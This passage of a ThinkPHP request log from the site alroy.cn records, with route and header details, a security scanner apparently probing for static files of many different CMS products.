+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:33+08:00 ] 60.205.45.195 140.205.201.41 GET /SiteServer/Pic/Company/login.gif
+[ log ] alroy.cn/SiteServer/Pic/Company/login.gif [运行时间：0.026111s][吞吐率：38.30req/s] [内存消耗：1,838.52kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'SiteServer',
+    1 => 'Pic',
+    2 => 'Company',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:33+08:00 ] 60.205.45.195 140.205.201.41 GET /SiteServer/Pic/tree/itemContainer.gif
+[ log ] alroy.cn/SiteServer/Pic/tree/itemContainer.gif [运行时间：0.029371s][吞吐率：34.05req/s] [内存消耗：1,838.48kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'SiteServer',
+    1 => 'Pic',
+    2 => 'tree',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:34+08:00 ] 60.205.45.195 140.205.201.41 GET /Images/Silder/sldr3h_sl.gif
+[ log ] alroy.cn/Images/Silder/sldr3h_sl.gif [运行时间：0.025539s][吞吐率：39.16req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Images',
+    1 => 'Silder',
+    2 => 'sldr3h_sl.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:34+08:00 ] 60.205.45.195 140.205.201.41 GET /Admin/Images/LoginImages/logyh.gif
+[ log ] alroy.cn/Admin/Images/LoginImages/logyh.gif [运行时间：0.026761s][吞吐率：37.37req/s] [内存消耗：1,839.57kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Admin',
+    1 => 'Images',
+    2 => 'LoginImages',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:34+08:00 ] 60.205.45.195 140.205.201.41 GET /public/images/xueli_1.jpg
+[ log ] alroy.cn/public/images/xueli_1.jpg [运行时间：0.027299s][吞吐率：36.63req/s] [内存消耗：1,838.53kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'public',
+    1 => 'images',
+    2 => 'xueli_1.jpg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:35+08:00 ] 60.205.45.195 140.205.201.41 GET /statics/images/admin_img/arrowhead-y.png
+[ log ] alroy.cn/statics/images/admin_img/arrowhead-y.png [运行时间：0.026275s][吞吐率：38.06req/s] [内存消耗：1,838.73kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'statics',
+    1 => 'images',
+    2 => 'admin_img',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:35+08:00 ] 60.205.45.195 140.205.201.41 GET /phpsso_server/statics/images/msg_img/chrome_s_1.png
+[ log ] alroy.cn/phpsso_server/statics/images/msg_img/chrome_s_1.png [运行时间：0.029273s][吞吐率：34.16req/s] [内存消耗：1,839.35kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'phpsso_server',
+    1 => 'statics',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'msg_img' => 'chrome_s_1.png',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:35+08:00 ] 60.205.45.195 140.205.201.41 GET /images/buddies.png
+[ log ] alroy.cn/images/buddies.png [运行时间：0.026867s][吞吐率：37.22req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'buddies.png',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:36+08:00 ] 60.205.45.195 140.205.201.41 GET /script/valid_formdata.js
+[ log ] alroy.cn/script/valid_formdata.js [运行时间：0.025877s][吞吐率：38.64req/s] [内存消耗：1,838.53kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'script',
+    1 => 'valid_formdata.js',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:36+08:00 ] 60.205.45.195 140.205.201.41 GET /data/images/base_lr/email_button.png
+[ log ] alroy.cn/data/images/base_lr/email_button.png [运行时间：0.026514s][吞吐率：37.72req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'data',
+    1 => 'images',
+    2 => 'base_lr',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:36+08:00 ] 60.205.45.195 140.205.201.41 GET /themes/admin/images/fenlan_li_bg.gif
+[ log ] alroy.cn/themes/admin/images/fenlan_li_bg.gif [运行时间：0.027544s][吞吐率：36.31req/s] [内存消耗：1,838.46kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'themes',
+    1 => 'admin',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:36+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/templates/images/subTypeBg.gif
+[ log ] alroy.cn/admin/templates/images/subTypeBg.gif [运行时间：0.028113s][吞吐率：35.57req/s] [内存消耗：1,839.58kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'templates',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:37+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/templates/images/filestate.png
+[ log ] alroy.cn/admin/templates/images/filestate.png [运行时间：0.027784s][吞吐率：35.99req/s] [内存消耗：1,839.58kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'templates',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:37+08:00 ] 60.205.45.195 140.205.201.41 GET /images/ad_location_middle_center1.jpg
+[ log ] alroy.cn/images/ad_location_middle_center1.jpg [运行时间：0.026408s][吞吐率：37.87req/s] [内存消耗：1,838.52kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'ad_location_middle_center1.jpg',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:37+08:00 ] 60.205.45.195 140.205.201.41 GET /theme/t1/themebg_preview.jpg
+[ log ] alroy.cn/theme/t1/themebg_preview.jpg [运行时间：0.027311s][吞吐率：36.62req/s] [内存消耗：1,838.70kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'theme',
+    1 => 't1',
+    2 => 'themebg_preview.jpg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:38+08:00 ] 60.205.45.195 140.205.201.41 GET /images/table_bg.jpg
+[ log ] alroy.cn/images/table_bg.jpg [运行时间：0.026330s][吞吐率：37.98req/s] [内存消耗：1,838.40kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'table_bg.jpg',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:38+08:00 ] 60.205.45.195 140.205.201.41 GET /images/ext/midi.gif
+[ log ] alroy.cn/images/ext/midi.gif [运行时间：0.028043s][吞吐率：35.66req/s] [内存消耗：1,838.63kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'ext',
+    2 => 'midi.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:38+08:00 ] 60.205.45.195 140.205.201.41 GET /wp-includes/images/icon-pointer-flag.png
+[ log ] alroy.cn/wp-includes/images/icon-pointer-flag.png [运行时间：0.027487s][吞吐率：36.38req/s] [内存消耗：1,838.78kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wp-includes',
+    1 => 'images',
+    2 => 'icon-pointer-flag.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:39+08:00 ] 60.205.45.195 140.205.201.41 GET /wp-admin/images/yes.png
+[ log ] alroy.cn/wp-admin/images/yes.png [运行时间：0.026051s][吞吐率：38.39req/s] [内存消耗：1,838.72kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wp-admin',
+    1 => 'images',
+    2 => 'yes.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:39+08:00 ] 60.205.45.195 140.205.201.41 GET /wp-admin/js/farbtastic.js
+[ log ] alroy.cn/wp-admin/js/farbtastic.js [运行时间：0.025740s][吞吐率：38.85req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wp-admin',
+    1 => 'js',
+    2 => 'farbtastic.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:39+08:00 ] 60.205.45.195 140.205.201.41 GET /wp-includes/js/swfupload/plugins/swfupload.queue.js
+[ log ] alroy.cn/wp-includes/js/swfupload/plugins/swfupload.queue.js [运行时间：0.026607s][吞吐率：37.58req/s] [内存消耗：1,839.20kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wp-includes',
+    1 => 'js',
+    2 => 'swfupload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'plugins' => 'swfupload.queue.js',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:40+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/images/comment_alert.gif
+[ log ] alroy.cn/admin/images/comment_alert.gif [运行时间：0.027905s][吞吐率：35.84req/s] [内存消耗：1,839.59kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'images',
+    2 => 'comment_alert.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:40+08:00 ] 60.205.45.195 140.205.201.41 GET /data/avatar/no_photo.gif
+[ log ] alroy.cn/data/avatar/no_photo.gif [运行时间：0.025422s][吞吐率：39.34req/s] [内存消耗：1,838.54kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'data',
+    1 => 'avatar',
+    2 => 'no_photo.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:40+08:00 ] 60.205.45.195 140.205.201.41 GET /views/default/skin/blue/images/front/buying.gif
+[ log ] alroy.cn/views/default/skin/blue/images/front/buying.gif [运行时间：0.025808s][吞吐率：38.75req/s] [内存消耗：1,839.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'views',
+    1 => 'default',
+    2 => 'skin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'blue' => 'images',
+  'front' => 'buying.gif',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:41+08:00 ] 60.205.45.195 140.205.201.41 GET /install/images/guide_1.gif
+[ log ] alroy.cn/install/images/guide_1.gif [运行时间：0.026502s][吞吐率：37.73req/s] [内存消耗：1,838.54kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'install',
+    1 => 'images',
+    2 => 'guide_1.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:41+08:00 ] 60.205.45.195 140.205.201.41 GET /upload/2011/11/30/20111130113535527.jpg
+[ log ] alroy.cn/upload/2011/11/30/20111130113535527.jpg [运行时间：0.027022s][吞吐率：37.01req/s] [内存消耗：1,839.20kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'upload',
+    1 => '2011',
+    2 => '11',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  0 => '20111130113535527.jpg',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:41+08:00 ] 60.205.45.195 140.205.201.41 GET /plus/weather/icon/a_12.gif
+[ log ] alroy.cn/plus/weather/icon/a_12.gif [运行时间：0.025855s][吞吐率：38.68req/s] [内存消耗：1,838.52kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'plus',
+    1 => 'weather',
+    2 => 'icon',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:42+08:00 ] 60.205.45.195 140.205.201.41 GET /question/images/face/images/ico_face_arrow.gif
+[ log ] alroy.cn/question/images/face/images/ico_face_arrow.gif [运行时间：0.027648s][吞吐率：36.17req/s] [内存消耗：1,839.25kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'question',
+    1 => 'images',
+    2 => 'face',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'ico_face_arrow.gif',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:42+08:00 ] 60.205.45.195 140.205.201.41 GET /images/movienr_right01.jpg
+[ log ] alroy.cn/images/movienr_right01.jpg [运行时间：0.025290s][吞吐率：39.54req/s] [内存消耗：1,838.54kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'movienr_right01.jpg',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
